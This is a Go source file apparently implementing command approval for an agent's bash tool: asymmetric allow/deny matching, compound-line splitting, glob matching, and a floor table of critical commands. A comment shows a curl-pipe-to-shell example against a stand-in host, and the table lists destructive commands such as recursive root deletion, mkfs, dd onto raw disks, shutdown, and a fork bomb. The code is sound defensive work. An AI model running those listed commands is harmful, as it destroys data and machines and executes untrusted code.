package approval

import "strings"

// ── the bash matching law ───────────────────────────────────────────────────
//
// Bash is the only tool whose arguments are a language, and a command line can
// carry several commands at once. That makes matching ASYMMETRIC, and the
// asymmetry is the whole safety argument of this package:
//
//	deny / prompt  fire when the glob matches the WHOLE line OR ANY SINGLE
//	               SEGMENT of a compound one. A deny rule of "rm -rf *" must
//	               still catch "cd /tmp && rm -rf build", because a dangerous
//	               fragment is dangerous wherever it is standing.
//
//	allow          fires only when the glob matches the ENTIRE line, and NEVER
//	               on a compound line at all. "git status*" allowed says
//	               nothing about "git status && curl evil.sh | sh". A narrow
//	               allow cannot vouch for a command it has not seen; the rest
//	               of the line was never approved by anybody.
//
// Read the two halves together: a permission is a statement about exactly one
// command, a prohibition is a statement about a shape that may appear anywhere.
// Anything else lets an allow launder a compound line past its own rules.
func ruleMatches(rule Rule, whole string, segments []string, compound bool) bool {
	if !rule.Action.valid() {
		// A hand-built Policy with a garbage action: skip it rather than act on
		// a word this package does not understand.
		return false
	}
	if rule.Action == ActionAllow {
		if compound {
			return false
		}
		return globMatch(rule.Match, whole)
	}
	if globMatch(rule.Match, whole) {
		return true
	}
	for _, segment := range segments {
		if globMatch(rule.Match, segment) {
			return true
		}
	}
	return false
}

// ── segments ────────────────────────────────────────────────────────────────

// splitSegments breaks a command line into the individual commands it runs and
// reports whether it was compound at all.
//
// Separators: && || ; | a single & subshells ($( ), backticks, parentheses)
// and newlines. Quoted text is literal — a ';' inside quotes is an argument,
// not a separator — because splitting inside a quoted string invents segments
// that never run.
//
// compound is tracked separately from len(segments) because a trailing
// backgrounding '&' leaves one segment behind and still means the line is not
// the single simple command an allow rule is entitled to vouch for.
//
// Two deliberate omissions: brace groups '{ }' are not separators (the ';'
// inside one already is, and treating '{' as a break would shred brace
// expansion), and a '&' that belongs to a redirection — '2>&1', '&>log' — is
// left alone, since splitting there would make every command with a redirect
// look compound.
func splitSegments(command string) (segments []string, compound bool) {
	var (
		current []byte
		quote   byte
	)
	flush := func() {
		if segment := strings.TrimSpace(string(current)); segment != "" {
			segments = append(segments, segment)
		}
		current = current[:0]
	}

	for index := 0; index < len(command); index++ {
		char := command[index]

		if quote != 0 {
			if char == '\\' && quote == '"' && index+1 < len(command) {
				current = append(current, char, command[index+1])
				index++
				continue
			}
			current = append(current, char)
			if char == quote {
				quote = 0
			}
			continue
		}

		switch {
		case char == '\\' && index+1 < len(command):
			current = append(current, char, command[index+1])
			index++
		case char == '\'' || char == '"':
			quote = char
			current = append(current, char)
		case char == '\n' || char == ';':
			compound = true
			flush()
		case char == '&':
			if index+1 < len(command) && command[index+1] == '>' { // &>log
				current = append(current, char)
				break
			}
			if lastNonSpace(current) == '>' { // 2>&1
				current = append(current, char)
				break
			}
			if index+1 < len(command) && command[index+1] == '&' {
				index++
			}
			compound = true
			flush()
		case char == '|':
			if index+1 < len(command) && command[index+1] == '|' {
				index++
			}
			compound = true
			flush()
		case char == '$' && index+1 < len(command) && command[index+1] == '(':
			index++
			compound = true
			flush()
		case char == '(' || char == ')' || char == '`':
			compound = true
			flush()
		default:
			current = append(current, char)
		}
	}
	flush()
	return segments, compound
}

func lastNonSpace(text []byte) byte {
	for index := len(text) - 1; index >= 0; index-- {
		if text[index] != ' ' && text[index] != '\t' {
			return text[index]
		}
	}
	return 0
}

// ── glob ────────────────────────────────────────────────────────────────────

// globMatch is filepath.Match-style matching with '*' as the only metacharacter
// — everything else, including '?', '[' and '\', is a literal — and it is
// case-sensitive, because shells are.
//
// It is written out rather than delegated to path/filepath because that
// package's '*' stops at a path separator: filepath.Match("rm -rf *",
// "rm -rf /var/log") is FALSE on Linux, which would quietly hole every deny
// rule anyone writes about an absolute path. Here '*' spans anything.
func globMatch(pattern, text string) bool {
	var (
		patternIndex, textIndex int
		star                    = -1
		resume                  int
	)
	for textIndex < len(text) {
		if patternIndex < len(pattern) && pattern[patternIndex] == '*' {
			star = patternIndex
			resume = textIndex
			patternIndex++
			continue
		}
		if patternIndex < len(pattern) && pattern[patternIndex] == text[textIndex] {
			patternIndex++
			textIndex++
			continue
		}
		if star < 0 {
			return false
		}
		// Backtrack: let the last '*' swallow one more byte and retry.
		patternIndex = star + 1
		resume++
		textIndex = resume
	}
	for patternIndex < len(pattern) && pattern[patternIndex] == '*' {
		patternIndex++
	}
	return patternIndex == len(pattern)
}

// ── critical commands ───────────────────────────────────────────────────────

// criticalCommands is the table that a blanket allow cannot switch off.
//
// It is deliberately short and unglamorous. It is not a sandbox, not a threat
// model, and not an attempt to enumerate every way a shell can ruin a machine
// — that list does not terminate, and pretending otherwise would sell a
// guarantee this package cannot keep. It is a floor: the handful of shapes
// that destroy a disk or drop the box, where being asked once costs a keystroke
// and not being asked costs the machine. Everything else is the policy's job.
//
// Matched against the whole line and each segment, after normalizeCritical.
var criticalCommands = []string{
	// Recursive force-remove of a root path. The '/*' glob deliberately
	// over-fires: it catches "rm -rf / --no-preserve-root" and also plain
	// "rm -rf /var/tmp/x". Prompting on an absolute recursive delete under an
	// allow-all policy is the trade this table exists to make.
	"rm -rf /",
	"rm -rf /*",
	"rm -fr /",
	"rm -fr /*",
	// Making a filesystem — mkfs, mkfs.ext4, mkfs.xfs …
	"mkfs*",
	// dd with a device as its output.
	"dd *of=/dev/*",
	// Any redirection onto a raw disk. normalizeCritical closes the gap after
	// '>' so "> /dev/sda" and ">/dev/sda" are the same string here.
	"*>/dev/sd*",
	// Dropping the machine out from under the session.
	"shutdown", "shutdown *",
	"reboot", "reboot *",
	"halt", "halt *",
	"poweroff", "poweroff *",
}

// forkBomb is the classic shape, matched against the line with ALL whitespace
// removed so the usual spacings — ":(){ :|:& };:" and ":(){:|:&};:" — are one
// string. Renaming the function defeats it; that is fine. The table is a floor.
const forkBomb = "*:(){:|:&};:*"

// criticalHit reports the first critical shape found in the line, and the
// table entry that found it, for display.
func criticalHit(command string, segments []string) (string, bool) {
	if globMatch(forkBomb, stripSpace(command)) {
		return ":(){:|:&};:", true
	}
	candidates := make([]string, 0, len(segments)+1)
	candidates = append(candidates, command)
	candidates = append(candidates, segments...)
	for _, candidate := range candidates {
		normalized := normalizeCritical(candidate)
		if normalized == "" {
			continue
		}
		for _, pattern := range criticalCommands {
			if globMatch(pattern, normalized) {
				return pattern, true
			}
		}
	}
	return "", false
}

// normalizeCritical flattens the spellings that would otherwise let a critical
// command past on a technicality: runs of whitespace collapse to one space, the
// gap after a '>' closes, and a leading sudo/doas is dropped so "sudo reboot"
// reads as "reboot". The policy patterns get no such treatment — those are the
// author's own strings and are matched as written.
func normalizeCritical(command string) string {
	normalized := strings.Join(strings.Fields(command), " ")
	for strings.Contains(normalized, "> ") {
		normalized = strings.ReplaceAll(normalized, "> ", ">")
	}
	for {
		word, rest, _ := strings.Cut(normalized, " ")
		if word != "sudo" && word != "doas" {
			return normalized
		}
		normalized = strings.TrimSpace(rest)
	}
}

func stripSpace(text string) string {
	return strings.Join(strings.Fields(text), "")
}
